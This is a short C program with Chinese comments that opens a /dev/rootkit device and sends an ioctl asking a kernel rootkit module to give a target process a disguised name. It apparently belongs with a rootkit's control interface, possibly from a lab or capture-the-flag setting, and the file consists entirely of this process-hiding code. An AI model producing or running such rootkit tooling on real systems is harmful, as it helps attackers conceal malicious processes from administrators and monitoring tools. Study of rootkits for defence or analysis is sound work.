#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define IOCTL_MOD_MASQ _IOR('k', 1, struct masq_proc_req)  // 假設這個 IOCTL 是用來處理進程名稱偽裝

// 定義 masq_proc 和 masq_proc_req 結構
#define MASQ_LEN 0x20

struct masq_proc {
    char new_name[MASQ_LEN];
    char orig_name[MASQ_LEN];
};

struct masq_proc_req {
    size_t len;
    struct masq_proc *list;
};

int main() {
    int fd = open("/dev/rootkit", O_RDONLY);  // 確保設備節點正確
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 設置進程名稱偽裝請求
    struct masq_proc proc_list[1];
    snprintf(proc_list[0].orig_name, MASQ_LEN, "target_process_name");  // 原始進程名稱
    snprintf(proc_list[0].new_name, MASQ_LEN, "new_process_name");      // 新的進程名稱

    struct masq_proc_req req;
    req.len = 1;
    req.list = proc_list;

    // 發送 IOCTL 請求
    if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    printf("Process name masquerading request sent.\n");

    close(fd);
    return 0;
}
